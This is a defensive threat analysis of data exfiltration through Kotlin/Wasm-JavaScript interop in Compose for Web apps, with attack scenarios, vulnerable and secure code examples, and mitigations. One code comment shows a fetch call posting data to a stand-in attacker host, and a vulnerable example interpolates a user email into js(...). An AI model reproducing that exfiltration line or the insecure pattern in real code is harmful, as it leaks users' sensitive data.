# Deep Analysis: JavaScript Interop Vulnerabilities (Wasm/JS) - Data Exfiltration

## 1. Objective, Scope, and Methodology

### 1.1. Objective

The primary objective of this deep analysis is to thoroughly understand the "JavaScript Interop Vulnerabilities (Wasm/JS) - Data Exfiltration" threat, identify specific attack vectors within a Compose for Web application, assess the potential impact, and propose concrete, actionable mitigation strategies beyond the high-level recommendations already provided.  We aim to provide developers with practical guidance to secure their applications against this specific threat.

### 1.2. Scope

This analysis focuses exclusively on the data exfiltration aspect of JavaScript interop vulnerabilities within the context of Compose for Web applications built using the `compose-jb` library.  It covers:

*   **Kotlin/Wasm to JavaScript communication:**  How data flows between the Kotlin/Wasm side and the JavaScript side of the application.
*   **`js(...)` and `external` declarations:**  The primary mechanisms for JavaScript interop in Kotlin/Wasm.
*   **Composable functions:**  How these functions can be exploited if they handle sensitive data and interact with JavaScript.
*   **Data exposure points:**  Identifying specific areas where sensitive data might be unintentionally exposed to JavaScript.
*   **Attack vectors:**  Specific ways an attacker might exploit these vulnerabilities.
*   **Mitigation techniques:**  Detailed, practical steps to prevent data exfiltration.

This analysis *does not* cover:

*   General WebAssembly security best practices (those are important but outside the scope of this specific threat).
*   Other types of JavaScript interop vulnerabilities (e.g., code injection, which is related but distinct).
*   Vulnerabilities in third-party JavaScript libraries (those should be addressed separately).

### 1.3. Methodology

The analysis will follow these steps:

1.  **Threat Modeling Review:**  Reiterate the threat description and impact from the provided threat model.
2.  **Technical Deep Dive:**  Explain the underlying mechanisms of JavaScript interop in Compose for Web, focusing on potential vulnerabilities.
3.  **Attack Vector Analysis:**  Describe specific scenarios where an attacker could exploit these vulnerabilities to exfiltrate data.
4.  **Code Example Analysis:**  Present hypothetical (but realistic) code examples demonstrating vulnerable patterns and their secure counterparts.
5.  **Mitigation Strategy Elaboration:**  Expand on the initial mitigation strategies, providing detailed, actionable recommendations.
6.  **Tooling and Testing Recommendations:**  Suggest tools and testing techniques to identify and prevent these vulnerabilities.

## 2. Threat Modeling Review

*   **Threat:** JavaScript Interop Vulnerabilities (Wasm/JS) - Data Exfiltration
*   **Description:**  Attackers exploit the Kotlin/Wasm-JavaScript bridge to access and exfiltrate sensitive data from the Compose application.
*   **Impact:**  Leakage of sensitive user data (passwords, PII, financial data).  Reputational damage, legal and financial consequences.
*   **Affected Component:**  Kotlin code using `js(...)` or `external` declarations, especially `Composable` functions handling sensitive data and interacting with JavaScript.
*   **Risk Severity:** High

## 3. Technical Deep Dive: JavaScript Interop in Compose for Web

Compose for Web, when targeting WebAssembly, compiles Kotlin code to Wasm.  Wasm, by design, has limited direct access to the browser's DOM and JavaScript environment.  To interact with the browser, Kotlin/Wasm relies on JavaScript interop.  This interop is primarily achieved through:

*   **`js(...)`:**  This function allows embedding JavaScript code directly within Kotlin code.  It's a powerful but potentially dangerous tool, as it provides a direct conduit for data to flow between Kotlin/Wasm and JavaScript.  The JavaScript code within `js(...)` runs in the *global JavaScript context*.

    ```kotlin
    fun sendDataToJS(data: String) {
        js("console.log('Data received from Kotlin:', $data)") // Simple example, but could be malicious
    }
    ```

*   **`external` declarations:**  These declarations allow Kotlin code to call JavaScript functions and access JavaScript objects.  They define the *interface* between Kotlin and JavaScript.  The actual implementation resides in JavaScript.

    ```kotlin
    external fun sendDataToExternalService(data: String)

    // In JavaScript (or a separate .js file):
    // function sendDataToExternalService(data) {
    //   // Potentially malicious code here that exfiltrates 'data'
    //   fetch('https://attacker.com/exfiltrate', { method: 'POST', body: data });
    // }
    ```

*   **Data Conversion:**  When data is passed between Kotlin/Wasm and JavaScript, it needs to be converted to a compatible format.  This conversion process itself can be a source of vulnerabilities if not handled carefully.  For example, complex Kotlin objects might be serialized to JSON, and if that JSON serialization is flawed, it could expose more data than intended.

**The Core Vulnerability:** The fundamental vulnerability lies in the *trust boundary* between Kotlin/Wasm and JavaScript.  Kotlin/Wasm operates in a more controlled environment, while JavaScript has access to the full browser API and can potentially be manipulated by an attacker (e.g., through XSS or a compromised third-party library).  If sensitive data is passed to JavaScript without proper sanitization and validation, it can be exfiltrated.

## 4. Attack Vector Analysis

Here are some specific attack scenarios:

*   **Scenario 1:  XSS leading to Interop Exploitation:**
    *   An attacker injects malicious JavaScript code into the application (e.g., through a vulnerable input field).
    *   This injected script doesn't directly steal data. Instead, it *overwrites* or *hooks* into a legitimate JavaScript function that's called by the Kotlin/Wasm code via `external`.
    *   When the Kotlin/Wasm code calls the (now compromised) JavaScript function, passing sensitive data, the attacker's script intercepts and exfiltrates the data.

*   **Scenario 2:  `js(...)` Abuse:**
    *   A developer uses `js(...)` to interact with a third-party JavaScript library.  They inadvertently pass sensitive data directly to this library without proper sanitization.
    *   The third-party library is either compromised or has a vulnerability that allows the attacker to access the data passed to it.

*   **Scenario 3:  Data Leakage through Event Handlers:**
    *   A `Composable` function displays sensitive data and also sets up a JavaScript event listener (e.g., `onClick`).
    *   The event handler, defined in JavaScript (either inline via `js(...)` or through an `external` function), has access to the component's state, including the sensitive data.
    *   The attacker can trigger the event and the event handler code exfiltrates the data.

* **Scenario 4: Unintentional Exposure via Serialization**
    * A Kotlin data class containing sensitive information is passed to a JavaScript function.
    * The data class is automatically serialized to JSON.
    * A custom serializer (or a bug in the default serializer) exposes more fields than intended, including sensitive ones.
    * The JavaScript function receives the over-exposed JSON and can exfiltrate the sensitive data.

## 5. Code Example Analysis

**Vulnerable Example:**

```kotlin
@Composable
fun UserProfile(user: User) {
    Column {
        Text("Name: ${user.name}")
        Text("Email: ${user.email}") // Sensitive data

        Button(onClick = {
            js("sendEmailToAnalytics('${user.email}')") // Direct exposure of sensitive data
        }) {
            Text("Send Analytics")
        }
    }
}

data class User(val name: String, val email: String, val secretToken: String)
```

**Explanation of Vulnerability:**

*   The `user.email` is directly embedded into a JavaScript string within the `js(...)` call.  This is highly vulnerable to XSS.  If an attacker can inject code that modifies the `sendEmailToAnalytics` function, they can steal the email.
* The `User` data class contains `secretToken`, which is not displayed but could be exposed if the entire `User` object is passed to JavaScript.

**Secure Counterpart:**

```kotlin
@Composable
fun UserProfile(user: User) {
    Column {
        Text("Name: ${user.name}")
        Text("Email: [Hidden]") // Don't display sensitive data directly

        Button(onClick = {
            sendAnalyticsEvent("user_profile_viewed", mapOf("userId" to user.id)) // Send anonymized data
        }) {
            Text("Send Analytics")
        }
    }
}

// Separate function to handle analytics, minimizing exposure
external fun sendAnalyticsEvent(eventName: String, eventData: Map<String, String>)

data class User(val id: String, val name: String, val email: String, val secretToken: String)

//In Javascript
// function sendAnalyticsEvent(eventName, eventData) {
//     // Send only the necessary data to the analytics service
//     // Example:  fetch('/analytics', { method: 'POST', body: JSON.stringify({ event: eventName, data: eventData }) });
// }
```

**Explanation of Improvements:**

*   **Don't display sensitive data directly:**  The email is not displayed in the UI.
*   **Anonymized data:**  Instead of sending the email, we send a `userId` (assuming it's not sensitive itself).  This is a common practice in analytics.
*   **Separate function:**  The `sendAnalyticsEvent` function is defined as `external`, keeping the JavaScript implementation separate.  This allows for better auditing and control over the data sent to JavaScript.
*   **Controlled Data Transfer:** The `sendAnalyticsEvent` function only accepts a `Map<String, String>`. This limits the type of data that can be passed, reducing the risk of accidentally exposing complex objects.
* **Javascript side:** The Javascript implementation should also be carefully reviewed to ensure it only sends the necessary data and doesn't expose any sensitive information.

## 6. Mitigation Strategy Elaboration

Here's a more detailed breakdown of mitigation strategies:

1.  **Minimize JavaScript Interop:**
    *   **Principle of Least Privilege:**  Only use JavaScript interop when absolutely necessary.  Explore alternative solutions within the Kotlin/Wasm ecosystem whenever possible.
    *   **Avoid `js(...)` for Sensitive Data:**  Never directly embed sensitive data within `js(...)` calls.
    *   **Prefer `external` functions:**  Use `external` functions to define a clear interface between Kotlin and JavaScript.  This makes it easier to audit and control the data flow.

2.  **Strict Data Sanitization and Validation:**
    *   **Input Validation:**  Validate all data received from JavaScript *before* using it in Kotlin/Wasm.  This prevents malicious data from entering the Kotlin side.
    *   **Output Sanitization:**  Sanitize all data sent to JavaScript *before* passing it.  This prevents sensitive data from being leaked.
    *   **Data Type Restrictions:**  Use specific data types (e.g., `String`, `Int`, `Map<String, String>`) for interop, rather than complex objects.  This reduces the attack surface.
    *   **Whitelist, not Blacklist:**  Define a whitelist of allowed data and operations, rather than trying to blacklist known bad patterns.

3.  **Secure Data Handling within Compose:**
    *   **Don't Store Sensitive Data in UI State:**  Avoid storing sensitive data directly in `Composable` state variables if it's not absolutely necessary.
    *   **Use Secure Storage:**  If you need to store sensitive data, use appropriate secure storage mechanisms (e.g., encrypted storage, secure enclaves if available).
    *   **Ephemeral Data:**  Keep sensitive data in memory for the shortest possible time.  Clear it as soon as it's no longer needed.

4.  **Secure JavaScript Code:**
    *   **Treat External JavaScript as Untrusted:**  Assume that any JavaScript code (including third-party libraries) could be compromised.
    *   **Content Security Policy (CSP):**  Use CSP to restrict the sources from which JavaScript can be loaded and executed.  This can prevent XSS attacks from loading malicious scripts.
    *   **Subresource Integrity (SRI):**  Use SRI to ensure that third-party JavaScript libraries haven't been tampered with.
    *   **Regular Security Audits:**  Conduct regular security audits of your JavaScript code and dependencies.

5.  **Data Serialization Control:**
    *   **Explicit Serializers:** Use explicit JSON serializers (e.g., with kotlinx.serialization) and carefully control which fields are included in the serialization.
    *   **Avoid Automatic Serialization of Complex Objects:** If possible, avoid passing complex Kotlin objects directly to JavaScript. Instead, create simplified data transfer objects (DTOs) that contain only the necessary data.

## 7. Tooling and Testing Recommendations

*   **Static Analysis Tools:**
    *   **Detekt (with custom rules):**  Detekt is a static analysis tool for Kotlin.  You can create custom rules to detect potentially vulnerable patterns related to JavaScript interop (e.g., direct use of sensitive data in `js(...)`).
    *   **SonarQube/SonarLint:**  These tools can be configured to analyze Kotlin code and identify potential security vulnerabilities.

*   **Dynamic Analysis Tools:**
    *   **Browser Developer Tools:**  Use the browser's developer tools (Network tab, Console) to monitor network requests and JavaScript execution.  This can help you identify data exfiltration attempts.
    *   **OWASP ZAP (Zed Attack Proxy):**  ZAP is a web application security scanner that can be used to test for XSS and other vulnerabilities.

*   **Testing Techniques:**
    *   **Unit Tests:**  Write unit tests to verify that sensitive data is not being passed to JavaScript unintentionally.
    *   **Integration Tests:**  Test the interaction between Kotlin/Wasm and JavaScript code to ensure that data is being handled securely.
    *   **Fuzz Testing:**  Use fuzz testing to generate random inputs and test for unexpected behavior in your JavaScript interop code.
    *   **Penetration Testing:**  Engage a security professional to conduct penetration testing to identify vulnerabilities that might be missed by automated tools.

* **Dependency Management:**
    * Regularly update dependencies (both Kotlin and JavaScript) to their latest secure versions.
    * Use dependency scanning tools (e.g., OWASP Dependency-Check, Snyk) to identify known vulnerabilities in your dependencies.

By implementing these mitigation strategies and using the recommended tools and testing techniques, developers can significantly reduce the risk of data exfiltration through JavaScript interop vulnerabilities in their Compose for Web applications.  The key is to treat the JavaScript environment as untrusted and to carefully control the flow of data between Kotlin/Wasm and JavaScript.
